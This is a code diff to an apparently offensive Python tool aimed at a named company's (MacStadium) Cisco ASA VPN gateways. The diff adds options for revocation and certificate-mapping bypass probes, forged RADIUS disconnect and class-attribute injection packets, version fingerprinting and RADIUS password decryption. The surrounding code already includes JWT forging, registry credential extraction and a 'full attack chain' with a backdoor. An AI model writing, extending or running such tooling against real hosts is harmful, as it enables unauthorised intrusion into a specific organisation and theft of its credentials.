@@ -154,9 +154,11 @@ try:
     from cisco_cstp_attack import (
         HostScanGateRE, CSTPTunnelRE, ASDMJarClassRE, GoBinaryRE,
         SAMLSpInjectionRE, UsernameTimingOracleRE, TunnelGroupEnumRE, RADIUSClassAttrRE,
+        CRLBypassRE, CertMapRE, RadiusCoARE, ASAVersionRE,
         OrkaJWTRE,
         analyze_asa_attack_surface, analyze_go_binary, analyze_java_class,
         analyze_saml_sp, analyze_username_oracle, analyze_tunnel_groups, analyze_radius_class_attr,
+        analyze_crl_bypass, analyze_cert_map, analyze_radius_coa, analyze_asa_version,
         analyze_orka_jwt,
         MACSTADIUM_SAML, MACSTADIUM_ASA,
     )
@@ -170,6 +172,10 @@ except ImportError:
     UsernameTimingOracleRE = None
     TunnelGroupEnumRE = None
     RADIUSClassAttrRE = None
+    CRLBypassRE = None
+    CertMapRE = None
+    RadiusCoARE = None
+    ASAVersionRE = None
 
 try:
     from orka_oidc_re import (
@@ -210,6 +216,28 @@ try:
 except ImportError:
     HAS_ORKA_VM_EXEC = False
     run_full_attack_chain = None
+
+try:
+    from modules.cisco_radius_ise_re import (
+        RadiusPacket, RadiusClassInjector, DAP_RADIUS_ATTRS,
+        ASA_A0_CODES, MACSTADIUM_GROUP_POLICIES, CLASS_ATTR_FORMAT,
+        analyze_radius_surface,
+    )
+    HAS_RADIUS_RE = True
+except ImportError:
+    HAS_RADIUS_RE = False
+    analyze_radius_surface = None
+
+try:
+    from modules.cisco_asa_lina_re import (
+        CiscoASALinaRE, radius_password_xor_decrypt,
+        tacacs_decrypt_body, LINA_AAA_STATE_MACHINE,
+        STATIC_ANALYSIS_METHODOLOGY, ARM64_REGS,
+    )
+    HAS_LINA_RE = True
+except ImportError:
+    HAS_LINA_RE = False
+    CiscoASALinaRE = None
 
 
 MACSTADIUM_ASAS = [
@@ -905,6 +933,14 @@ def main():
     parser.add_argument('--tunnel-groups-all', action='store_true', help='Tunnel group enum against all MacStadium ASAs')
     parser.add_argument('--radius-re', metavar='HOST', help='RADIUS class attr 25 attack surface RE')
     parser.add_argument('--radius-re-all', action='store_true', help='RADIUS class attr RE against all MacStadium ASAs')
+    parser.add_argument('--crl-bypass', metavar='HOST', help='CRL/OCSP reachability + revocation bypass chain RE')
+    parser.add_argument('--crl-bypass-all', action='store_true', help='CRL bypass probe against all MacStadium ASAs')
+    parser.add_argument('--cert-map', metavar='HOST', help='Cert-to-tunnel-group mapping RE + bypass chain')
+    parser.add_argument('--cert-map-all', action='store_true', help='Cert map RE against all MacStadium ASAs')
+    parser.add_argument('--radius-coa', metavar='HOST', help='RADIUS CoA mid-session attribute injection RE')
+    parser.add_argument('--radius-coa-all', action='store_true', help='RADIUS CoA RE against all MacStadium ASAs')
+    parser.add_argument('--asa-version', metavar='HOST', help='ASA version fingerprint from TLS/CSTP/cert artifacts')
+    parser.add_argument('--asa-version-all', action='store_true', help='ASA version fingerprint against all MacStadium ASAs')
     parser.add_argument('--orka-oidc', action='store_true', help='Orka3 OIDC flow RE + JWT forge (CVE-2020-26160, empty secret)')
     parser.add_argument('--orka-jwt', action='store_true', help='Analyze + forge MacStadium JWT (HS256 empty-secret)')
     parser.add_argument('--orka-binary-re', action='store_true', help='Print orka3 binary RE findings summary')
@@ -927,6 +963,10 @@ def main():
     parser.add_argument('--orka-regcreds', action='store_true', help='Extract Docker registry credentials from Orka API')
     parser.add_argument('--orka-virsh-chain', metavar='POD', help='Run virsh probe chain against orka-vm container in POD')
     parser.add_argument('--orka-attack-chain', action='store_true', help='Full Orka attack chain: enum + exec + SA token + regcreds')
+    # cisco_asa_lina_re flags
+    parser.add_argument('--lina-re', action='store_true', help='Cisco ASA lina ARM64 binary RE: AAA/RADIUS/TACACS+ attack surface')
+    parser.add_argument('--lina-binary', metavar='FILE', help='Path to extracted lina ELF for static analysis')
+    parser.add_argument('--radius-decrypt', nargs=3, metavar=('CIPHER_HEX','AUTH_HEX','SECRET'), help='Decrypt RADIUS User-Password: cipher_hex auth_hex shared_secret')
 
     args = parser.parse_args()
     
@@ -1240,15 +1280,83 @@ def main():
 
     elif getattr(args, 'radius_re', None) or getattr(args, 'radius_re_all', False):
         ablation.banner()
+        if not HAS_RADIUS_RE:
+            print("[-] cisco_radius_ise_re module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'radius_re_all', False) else [
+                {'host': args.radius_re, 'port': 1812, 'label': args.radius_re}
+            ]
+            for t in targets:
+                print(f"\n[*] RADIUS surface analysis: {t['label']} ({t['host']})")
+                result = analyze_radius_surface(t['host'], port=t['port'])
+                result['class_attr_format'] = CLASS_ATTR_FORMAT
+                result['group_policies']    = list(MACSTADIUM_GROUP_POLICIES.keys())
+                result['dap_radius_attrs']  = DAP_RADIUS_ATTRS
+                result['a0_codes']          = ASA_A0_CODES
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'crl_bypass', None) or getattr(args, 'crl_bypass_all', False):
+        ablation.banner()
         if not HAS_CSTP:
             print("[-] cisco_cstp_attack module not available")
         else:
-            targets = MACSTADIUM_ASAS if getattr(args, 'radius_re_all', False) else [
-                {'host': args.radius_re, 'port': 443, 'label': args.radius_re}
+            targets = MACSTADIUM_ASAS if getattr(args, 'crl_bypass_all', False) else [
+                {'host': args.crl_bypass, 'port': 443, 'label': args.crl_bypass}
             ]
             for t in targets:
-                print(f"\n[*] RADIUS class attr RE: {t['label']} ({t['host']})")
-                result = analyze_radius_class_attr(t['host'], t['port'])
+                print(f"\n[*] CRL bypass RE: {t['label']} ({t['host']})")
+                result = analyze_crl_bypass(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'cert_map', None) or getattr(args, 'cert_map_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'cert_map_all', False) else [
+                {'host': args.cert_map, 'port': 443, 'label': args.cert_map}
+            ]
+            for t in targets:
+                print(f"\n[*] Cert-map tunnel-group RE: {t['label']} ({t['host']})")
+                result = analyze_cert_map(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'radius_coa', None) or getattr(args, 'radius_coa_all', False):
+        ablation.banner()
+        if not HAS_RADIUS_RE:
+            print("[-] cisco_radius_ise_re module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'radius_coa_all', False) else [
+                {'host': args.radius_coa, 'port': 3799, 'label': args.radius_coa}
+            ]
+            for t in targets:
+                print(f"\n[*] RADIUS COA probe: {t['label']} ({t['host']}:3799)")
+                result = analyze_radius_surface(t['host'], port=1812)
+                injector = RadiusClassInjector(shared_secret=b'')
+                coa_pkt = injector.build_disconnect_request(
+                    nas_ip=t['host'], session_id='0'
+                )
+                result['coa_pkt_hex']  = coa_pkt.hex()
+                result['coa_pkt_len']  = len(coa_pkt)
+                result['inject_vector'] = {
+                    'attr': 25,
+                    'format': CLASS_ATTR_FORMAT,
+                    'target_policies': list(MACSTADIUM_GROUP_POLICIES.keys()),
+                    'msg_auth_required_for_integrity': True,
+                }
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'asa_version', None) or getattr(args, 'asa_version_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'asa_version_all', False) else [
+                {'host': args.asa_version, 'port': 443, 'label': args.asa_version}
+            ]
+            for t in targets:
+                print(f"\n[*] ASA version fingerprint: {t['label']} ({t['host']})")
+                result = analyze_asa_version(t['host'], t['port'])
                 print(json.dumps(result, indent=2, default=str))
 
     elif getattr(args, 'orka_oidc', False):
@@ -1419,6 +1527,30 @@ def main():
             print(BACKDOOR_CHAIN_DOC)
             result = run_full_attack_chain()
             print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'lina_re', False) or getattr(args, 'lina_binary', None) or getattr(args, 'radius_decrypt', None):
+        ablation.banner()
+        if not HAS_LINA_RE:
+            print("[-] cisco_asa_lina_re module not available")
+        elif getattr(args, 'radius_decrypt', None):
+            import binascii
+            cipher, auth, secret = args.radius_decrypt
+            pw = radius_password_xor_decrypt(
+                binascii.unhexlify(cipher),
+                secret.encode(),
+                binascii.unhexlify(auth)
+            )
+            print(f"[+] RADIUS User-Password decrypt: {pw!r}")
+        else:
+            binary = getattr(args, 'lina_binary', None)
+            print(f"[*] Cisco ASA lina ARM64 RE — {'static: ' + binary if binary else 'methodology + attack surface'}")
+            findings = CiscoASALinaRE(binary_path=binary).run()
+            for f in findings:
+                print(f"\n[{f['severity']}] {f['id']}: {f['title']}")
+                print(f"  {f['detail']}")
+                if f.get('evidence'):
+                    for k, v in list(f['evidence'].items())[:3]:
+                        print(f"  {k}: {str(v)[:100]}")
 
     elif args.containers:
         ablation.banner()
